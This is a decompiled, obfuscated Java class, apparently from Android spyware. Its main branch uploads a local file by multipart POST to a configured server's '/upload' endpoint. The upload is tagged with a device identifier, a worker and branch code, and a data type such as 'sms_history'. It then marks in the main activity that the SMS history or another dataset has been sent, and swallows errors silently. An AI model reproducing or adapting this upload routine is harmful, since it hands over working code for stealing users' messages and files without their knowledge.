package com.vdodsodjsdt;

import android.content.Context;
import android.util.Log;
import androidx.work.impl.WorkDatabase;
import java.io.File;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

/* JADX INFO: compiled from: r8-map-id-3f77bbef96f83a8bf86e140490b9d41fcf0723d2c79bd2f3f370cb94135e1be4 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class A3Dwt6MW552ix3T0Q implements Runnable {
    public final /* synthetic */ Object LaeGQIruHQu81hfJldjMOQSVblH3x;
    public final /* synthetic */ int V57tEvNfxZVVcOCAOih5PKr;
    public final /* synthetic */ Object ZLZeBXTMq0zDztBxtRTuCHrapQ;
    public final /* synthetic */ Object ZfQNn8hdWlEQ5cR94249PDsLR;
    public final /* synthetic */ Object zIvmSL0wzmmKGc3X39b2Gw2mUGE;

    public /* synthetic */ A3Dwt6MW552ix3T0Q(Object obj, Object obj2, Object obj3, Object obj4, int i) {
        this.V57tEvNfxZVVcOCAOih5PKr = i;
        this.ZfQNn8hdWlEQ5cR94249PDsLR = obj;
        this.LaeGQIruHQu81hfJldjMOQSVblH3x = obj2;
        this.zIvmSL0wzmmKGc3X39b2Gw2mUGE = obj3;
        this.ZLZeBXTMq0zDztBxtRTuCHrapQ = obj4;
    }

    @Override // java.lang.Runnable
    public final void run() throws Throwable {
        gILkjwpvkGF5oaalOyU gilkjwpvkgf5oaaloyuKo09zE6UAgwkV;
        sveu0WcbYc1gIe sveu0wcbyc1gieV57tEvNfxZVVcOCAOih5PKr;
        int i = this.V57tEvNfxZVVcOCAOih5PKr;
        Object obj = this.ZLZeBXTMq0zDztBxtRTuCHrapQ;
        Object obj2 = this.zIvmSL0wzmmKGc3X39b2Gw2mUGE;
        Object obj3 = this.LaeGQIruHQu81hfJldjMOQSVblH3x;
        Object obj4 = this.ZfQNn8hdWlEQ5cR94249PDsLR;
        switch (i) {
            case 0:
                List list = (List) obj4;
                AhgUxI6t6E ahgUxI6t6E = (AhgUxI6t6E) obj3;
                Eh21X7fdrXs eh21X7fdrXs = (Eh21X7fdrXs) obj2;
                WorkDatabase workDatabase = (WorkDatabase) obj;
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    ((SBDculXSmt) it.next()).VxUQ9tBhpHJ2AAEDNW8sghc4m(ahgUxI6t6E.VxUQ9tBhpHJ2AAEDNW8sghc4m);
                }
                IajRZM8bx6ydOtWJS1Sd9DI.zzpBGItXfub0yWj(eh21X7fdrXs, workDatabase, list);
                return;
            default:
                Context context = (Context) obj4;
                File file = (File) obj3;
                String str = (String) obj2;
                Skgk8FYn8b4TvRiBOsElZw4XkNLhQ skgk8FYn8b4TvRiBOsElZw4XkNLhQ = (Skgk8FYn8b4TvRiBOsElZw4XkNLhQ) obj;
                MainActivity mainActivity = (MainActivity) skgk8FYn8b4TvRiBOsElZw4XkNLhQ.ZfQNn8hdWlEQ5cR94249PDsLR;
                String string = context.getResources().getString(R.string.HOST);
                ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(string, "getString(...)");
                try {
                    NrjuzzioPqfttNRptBDpZDzSYUrcM nrjuzzioPqfttNRptBDpZDzSYUrcM = new NrjuzzioPqfttNRptBDpZDzSYUrcM(11);
                    nrjuzzioPqfttNRptBDpZDzSYUrcM.vE4yDIjexsP2lGjLaTcB(rJU8vw74QW6FEAFs.ZLZeBXTMq0zDztBxtRTuCHrapQ);
                    String name = file.getName();
                    int i2 = EOksdALzG1YtVRjkh.VxUQ9tBhpHJ2AAEDNW8sghc4m;
                    u3oM4Jia4hn5PHaSzj7t25fUwRg7 u3om4jia4hn5phaszj7t25fuwrg7 = gILkjwpvkGF5oaalOyU.ZfQNn8hdWlEQ5cR94249PDsLR;
                    try {
                        gilkjwpvkgf5oaaloyuKo09zE6UAgwkV = KfeOQNOupsCg6878zi4e.ko09zE6UAgwkV("text/plain");
                    } catch (IllegalArgumentException unused) {
                        gilkjwpvkgf5oaaloyuKo09zE6UAgwkV = null;
                    }
                    nrjuzzioPqfttNRptBDpZDzSYUrcM.zIvmSL0wzmmKGc3X39b2Gw2mUGE(name, new qR4G0Ppspx4V2jaYTHnJ(gilkjwpvkgf5oaaloyuKo09zE6UAgwkV, file));
                    ArrayList arrayList = (ArrayList) nrjuzzioPqfttNRptBDpZDzSYUrcM.ZfQNn8hdWlEQ5cR94249PDsLR;
                    if (arrayList.isEmpty()) {
                        throw new IllegalStateException("Multipart body must have at least one part.");
                    }
                    rJU8vw74QW6FEAFs rju8vw74qw6feafs = new rJU8vw74QW6FEAFs((oA1WO3soICf8H1N6bgpG) nrjuzzioPqfttNRptBDpZDzSYUrcM.zzpBGItXfub0yWj, (gILkjwpvkGF5oaalOyU) nrjuzzioPqfttNRptBDpZDzSYUrcM.V57tEvNfxZVVcOCAOih5PKr, U7JVXX1Kyh43VgUF.NSjgqmGjEzuugn2SsG1mZFP(arrayList));
                    String strConcat = string.concat("/upload");
                    ej6unYlOWMDF.pYmKDYlAmhudp(strConcat, "<this>");
                    int i3 = 0;
                    try {
                        oLPwQu4XgJ olpwqu4xgj = new oLPwQu4XgJ(0);
                        olpwqu4xgj.zIvmSL0wzmmKGc3X39b2Gw2mUGE(null, strConcat);
                        sveu0wcbyc1gieV57tEvNfxZVVcOCAOih5PKr = olpwqu4xgj.V57tEvNfxZVVcOCAOih5PKr();
                    } catch (IllegalArgumentException unused2) {
                        sveu0wcbyc1gieV57tEvNfxZVVcOCAOih5PKr = null;
                    }
                    ej6unYlOWMDF.p59rPv72J9(sveu0wcbyc1gieV57tEvNfxZVVcOCAOih5PKr);
                    oLPwQu4XgJ olpwqu4xgjZIvmSL0wzmmKGc3X39b2Gw2mUGE = sveu0wcbyc1gieV57tEvNfxZVVcOCAOih5PKr.zIvmSL0wzmmKGc3X39b2Gw2mUGE();
                    olpwqu4xgjZIvmSL0wzmmKGc3X39b2Gw2mUGE.VxUQ9tBhpHJ2AAEDNW8sghc4m("uid", zonOxHotd3BwAPJcwqr6I6uQNngg4.qNPQb1obP7(context));
                    olpwqu4xgjZIvmSL0wzmmKGc3X39b2Gw2mUGE.VxUQ9tBhpHJ2AAEDNW8sghc4m("type", str);
                    String string2 = context.getResources().getText(R.string.WORKER).toString();
                    ej6unYlOWMDF.pYmKDYlAmhudp(string2, "s");
                    StringBuilder sb = new StringBuilder(string2);
                    while (true) {
                        int iPf1HsU8AK92buCoUaexm5AC = cwhrCnoVJBjJE2CBEAvBopmgF.Pf1HsU8AK92buCoUaexm5AC(sb, '_', i3, 4);
                        if (iPf1HsU8AK92buCoUaexm5AC == -1) {
                            String string3 = sb.toString();
                            ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(string3, "toString(...)");
                            olpwqu4xgjZIvmSL0wzmmKGc3X39b2Gw2mUGE.VxUQ9tBhpHJ2AAEDNW8sghc4m("worker", string3);
                            olpwqu4xgjZIvmSL0wzmmKGc3X39b2Gw2mUGE.VxUQ9tBhpHJ2AAEDNW8sghc4m("branch", context.getResources().getText(R.string.BRANCH).toString());
                            String str2 = olpwqu4xgjZIvmSL0wzmmKGc3X39b2Gw2mUGE.V57tEvNfxZVVcOCAOih5PKr().NSjgqmGjEzuugn2SsG1mZFP;
                            UL4JI0eLnaD84py2JT uL4JI0eLnaD84py2JT = new UL4JI0eLnaD84py2JT(2);
                            uL4JI0eLnaD84py2JT.Ca81ebIan1u(str2);
                            uL4JI0eLnaD84py2JT.GI83zq0G8e7zkn("POST", rju8vw74qw6feafs);
                            VSncX8ksA0tswc2TMhzhOMdd.VxUQ9tBhpHJ2AAEDNW8sghc4m(null, null, context, new tpLngQCdAeyjjtxlI(uL4JI0eLnaD84py2JT), 3);
                            if (str.equals("sms_history")) {
                                mainActivity.pzqP2AqKW6J5PO8zCKnW = true;
                                skgk8FYn8b4TvRiBOsElZw4XkNLhQ.jW7EiD0YL6xkbB158jMUzhWNWb1y();
                                return;
                            } else {
                                mainActivity.aXO0LSrt8bKV = true;
                                skgk8FYn8b4TvRiBOsElZw4XkNLhQ.jW7EiD0YL6xkbB158jMUzhWNWb1y();
                                return;
                            }
                        }
                        sb.insert(iPf1HsU8AK92buCoUaexm5AC, "\\");
                        i3 = iPf1HsU8AK92buCoUaexm5AC + 2;
                    }
                    break;
                } catch (Exception unused3) {
                    Log.d("uploadFile", "Error sending request");
                    return;
                }
                break;
        }
    }
}
